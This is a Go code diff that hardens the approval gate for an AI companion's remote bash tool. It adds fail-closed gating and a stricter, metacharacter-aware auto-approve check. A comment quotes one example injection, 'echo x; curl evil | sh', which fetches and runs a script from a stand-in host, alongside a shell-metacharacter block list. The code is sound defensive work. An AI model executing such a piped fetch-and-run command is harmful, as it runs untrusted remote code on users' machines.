@@ -9,7 +9,6 @@ import (
 	"strings"
 	"time"
 
-	"github.com/snth-ai/snth-companion/internal/approval"
 	"github.com/snth-ai/snth-companion/internal/config"
 	"github.com/snth-ai/snth-companion/internal/sandbox"
 )
@@ -55,7 +54,82 @@ func RegisterBash() {
 		Name:        "remote_bash",
 		Description: "Run a bash command on the paired Mac. Default cwd is the synth's sandbox root. Out-of-sandbox cwd requires user approval.",
 		DangerLevel: "prompt",
+		// bash gates conditionally: a command INSIDE the sandbox that
+		// matches the auto-approve allowlist runs without a prompt;
+		// anything else prompts (out-of-sandbox escalates to
+		// always-prompt). GatePolicy + ApprovalSummary keep that nuance
+		// under the central Dispatch gate.
+		GatePolicy:      bashGatePolicy,
+		ApprovalSummary: bashSummary,
 	}, bashHandler)
+}
+
+// bashGateEval resolves the cwd + auto-approve decision for a bash call.
+// Shared by the handler and the central-gate policy so both see the same
+// answer. Returns (resolvedCwd, inside sandbox, auto-approved, err).
+func bashGateEval(a BashArgs) (resolvedCwd string, inside, autoApproved bool, err error) {
+	cfg := config.Get()
+	cwd := a.Cwd
+	if cwd == "" {
+		cwd = config.DefaultSandboxRoot(cfg)
+		if cwd == "" {
+			return "", false, false, fmt.Errorf("no sandbox root — companion not paired")
+		}
+		_ = sandbox.EnsureDir(cwd)
+	}
+	resolvedCwd, err = sandbox.Resolve(cwd)
+	if err != nil {
+		return "", false, false, fmt.Errorf("resolve cwd: %w", err)
+	}
+	inside = sandbox.InsideAny(cfg.SandboxRoots, resolvedCwd)
+	autoApproved = isAutoApprovedCmd(cfg.AutoApproveBashPatterns, a.Cmd)
+	return resolvedCwd, inside, autoApproved, nil
+}
+
+// parseBashArgs unmarshals + normalizes bash args for the gate helpers.
+func parseBashArgs(raw json.RawMessage) (BashArgs, bool) {
+	var a BashArgs
+	if err := json.Unmarshal(raw, &a); err != nil {
+		return a, false
+	}
+	a.normalize()
+	a.Cmd = strings.TrimSpace(a.Cmd)
+	return a, a.Cmd != ""
+}
+
+// bashGatePolicy decides how the central gate treats a bash call.
+func bashGatePolicy(raw json.RawMessage) GateDecision {
+	a, ok := parseBashArgs(raw)
+	if !ok {
+		// Bad/empty args: let the handler produce the proper error, but
+		// fail closed on the gate so nothing runs without a decision.
+		return GatePrompt
+	}
+	_, inside, autoApproved, err := bashGateEval(a)
+	if err != nil {
+		// Can't resolve cwd → fail closed with a prompt.
+		return GateAlwaysPrompt
+	}
+	if inside && autoApproved {
+		return GateSkip
+	}
+	if !inside {
+		return GateAlwaysPrompt
+	}
+	return GatePrompt
+}
+
+// bashSummary renders the approval dialog text for remote_bash.
+func bashSummary(raw json.RawMessage) (string, string) {
+	a, ok := parseBashArgs(raw)
+	if !ok {
+		return "", ""
+	}
+	resolvedCwd, _, _, err := bashGateEval(a)
+	if err != nil {
+		resolvedCwd = a.Cwd
+	}
+	return fmt.Sprintf("Run bash command in %s:\n    %s", resolvedCwd, truncate(a.Cmd, 200)), ""
 }
 
 func bashHandler(ctx context.Context, raw json.RawMessage) (any, error) {
@@ -69,41 +143,13 @@ func bashHandler(ctx context.Context, raw json.RawMessage) (any, error) {
 		return nil, fmt.Errorf("cmd is required")
 	}
 
-	cfg := config.Get()
-
-	// Pick cwd: user-provided, or default sandbox root.
-	cwd := args.Cwd
-	if cwd == "" {
-		cwd = config.DefaultSandboxRoot(cfg)
-		if cwd == "" {
-			return nil, fmt.Errorf("no sandbox root — companion not paired")
-		}
-		_ = sandbox.EnsureDir(cwd)
-	}
-	resolvedCwd, err := sandbox.Resolve(cwd)
+	// Approval is enforced by the central Dispatch gate (bashGatePolicy):
+	// inside-sandbox + allowlisted commands run without a prompt, anything
+	// else was already approved before we got here. We still resolve the
+	// cwd for exec.
+	resolvedCwd, _, _, err := bashGateEval(args)
 	if err != nil {
-		return nil, fmt.Errorf("resolve cwd: %w", err)
-	}
-
-	inside := sandbox.InsideAny(cfg.SandboxRoots, resolvedCwd)
-	autoApproved := isAutoApprovedCmd(cfg.AutoApproveBashPatterns, args.Cmd)
-	if !inside || !autoApproved {
-		summary := fmt.Sprintf("Run bash command in %s:\n    %s", resolvedCwd, truncate(args.Cmd, 200))
-		danger := "prompt"
-		if !inside {
-			danger = "always-prompt"
-		}
-		ok, err := approval.Request(ctx, approval.Request_{
-			Tool:    "remote_bash",
-			Summary: summary,
-			Danger:  danger,
-		})
-		if err != nil {
-			return nil, fmt.Errorf("approval: %w", err)
-		}
-		if !ok {
-			return nil, fmt.Errorf("user denied")
-		}
+		return nil, err
 	}
 
 	// Build command with timeout.
@@ -151,10 +197,55 @@ func bashHandler(ctx context.Context, raw json.RawMessage) (any, error) {
 	}, nil
 }
 
+// bashMetaChars are shell metacharacters whose presence ANYWHERE in the
+// command disqualifies auto-approve: a prefix match on "echo " must not
+// let "echo x; curl evil | sh" through (the A5 hole). We check the raw
+// characters rather than trying to parse the shell grammar — any of these
+// means the command is more than a single simple invocation.
+const bashMetaChars = ";|&$<>`(){}\n\\!*?"
+
+// isAutoApprovedCmd reports whether cmd may skip the approval prompt.
+//
+// Argv-aware (replaces the old strings.HasPrefix, finding A5):
+//  1. ANY shell metacharacter disqualifies (no pipes/redirects/subshells/
+//     command substitution / globbing / background).
+//  2. The command is tokenized on whitespace; the FIRST token must match a
+//     pattern's program EXACTLY ("ls" must not match "lsof").
+//  3. A pattern may name a required subcommand ("git status") — then the
+//     first TWO tokens must match exactly.
+//
+// The remaining tokens are treated as plain args (already metachar-free by
+// step 1). Patterns come from cfg.AutoApproveBashPatterns; each is
+// interpreted as one or two exact tokens (trailing whitespace ignored, so
+// legacy "ls " / "grep " entries still work).
 func isAutoApprovedCmd(patterns []string, cmd string) bool {
 	trimmed := strings.TrimSpace(cmd)
+	if trimmed == "" {
+		return false
+	}
+	if strings.ContainsAny(trimmed, bashMetaChars) {
+		return false
+	}
+	tokens := strings.Fields(trimmed)
+	if len(tokens) == 0 {
+		return false
+	}
 	for _, p := range patterns {
-		if strings.HasPrefix(trimmed, p) {
+		want := strings.Fields(strings.TrimSpace(p))
+		if len(want) == 0 {
+			continue
+		}
+		if len(want) > len(tokens) {
+			continue
+		}
+		match := true
+		for i := range want {
+			if want[i] != tokens[i] {
+				match = false
+				break
+			}
+		}
+		if match {
 			return true
 		}
 	}
